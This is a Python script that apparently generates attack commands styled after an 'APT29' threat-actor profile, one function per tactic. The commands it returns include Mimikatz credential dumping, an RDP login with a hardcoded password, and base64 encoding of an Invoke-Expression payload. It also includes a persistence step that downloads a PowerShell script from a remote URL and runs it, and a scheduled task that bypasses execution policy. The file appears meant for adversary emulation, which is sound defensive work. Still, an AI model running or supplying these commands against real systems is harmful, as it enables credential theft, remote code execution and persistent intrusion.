import subprocess
import re
from typing import Dict, Optional

# Sample threat actor profiles can be maintained for dynamic template matching.
THREAT_PROFILES = {
    "APT29": {
        "enumeration": ["Get-NetUser", "Get-DomainSID"],
        "lateral_movement": ["Mimikatz", "RDP", "PowerShell"],
        "persistence": ["DLL Hijack", "Scheduled Tasks"],
        "evasion": ["String Obfuscation", "Base64 Encoding"],
    },
    # Additional profiles as needed
}

def generate_attack_script(profile_name: str, tactic: str, technique: Optional[str] = None) -> str:
    """
    Generates a script based on the given threat actor profile, tactic, and technique.
    Uses pre-configured profiles to dynamically create scripts matching known actor behaviors.
    """
    profile = THREAT_PROFILES.get(profile_name)
    if not profile:
        raise ValueError(f"No profile found for {profile_name}")
    
    if tactic not in profile:
        raise ValueError(f"Tactic '{tactic}' not found in {profile_name}'s profile")

    techniques = profile[tactic]
    chosen_technique = technique or techniques[0]  # Default to the first if not specified
    
    if tactic == "enumeration":
        return enumerate_network(chosen_technique)
    elif tactic == "lateral_movement":
        return execute_lateral_movement(chosen_technique)
    elif tactic == "evasion":
        return evasion_script(chosen_technique)
    elif tactic == "persistence":
        return persistence_script(chosen_technique)
    else:
        raise ValueError(f"Tactic '{tactic}' not supported")

def enumerate_network(method: str) -> str:
    if method == "Get-NetUser":
        return "Invoke-Command -ScriptBlock { Get-NetUser }"
    elif method == "Get-DomainSID":
        return "Get-DomainSID"
    else:
        return "Unrecognized enumeration method."

def execute_lateral_movement(method: str) -> str:
    if method == "Mimikatz":
        return "Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'"
    elif method == "RDP":
        return "xfreerdp /f /u:administrator /p:bubbles /v:10.4.25.63"
    else:
        return "Unrecognized lateral movement method."

def evasion_script(method: str) -> str:
    if method == "String Obfuscation":
        return "# Sample obfuscation\n" \
               "Write-Host (\"Spl\" + \"oits\" + \" are\" + \" fun!\")"
    elif method == "Base64 Encoding":
        return "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"Invoke-Expression $payload\"))"
    else:
        return "Unrecognized evasion method."

def persistence_script(method: str) -> str:
    if method == "DLL Hijack":
        return "$ErrorActionPreference= 'verbose' ; " \
               "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 ;" \
               "Invoke-WebRequest -Uri 'https://example.com/dllhijack.ps1' -OutFile 'C:\\Windows\\Temp\\dllhijack.ps1';" \
               "& 'C:\\Windows\\Temp\\dllhijack.ps1'"
    elif method == "Scheduled Tasks":
        return "schtasks /create /tn \"MyTask\" /tr \"powershell.exe -ExecutionPolicy Bypass -File C:\\path\\to\\script.ps1\" /sc onlogon"
    else:
        return "Unrecognized persistence method."

# Example of use:
try:
    script_output = generate_attack_script("APT29", "enumeration", "Get-NetUser")
    print("Generated Script:\n", script_output)
except ValueError as e:
    print(e)
